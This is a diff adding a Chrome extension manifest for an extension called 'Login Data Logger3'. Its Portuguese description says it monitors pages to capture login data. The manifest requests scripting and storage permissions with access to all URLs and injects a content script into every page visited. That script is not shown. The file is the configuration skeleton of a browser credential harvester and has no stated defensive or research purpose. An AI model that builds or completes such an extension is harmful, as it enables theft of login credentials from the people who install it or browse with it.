@@ -1,0 +1,18 @@
+{
+  "manifest_version": 3,
+  "name": "Login Data Logger3",
+  "version": "1.0",
+  "description": "Monitora a página para capturar dados de login.",
+  "permissions": ["activeTab", "scripting", "storage"],
+  "host_permissions": ["<all_urls>"],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"],
+      "run_at": "document_idle"
+    }
+  ],
+  "action": {
+      "default_popup": "popup.html"
+  }
+}
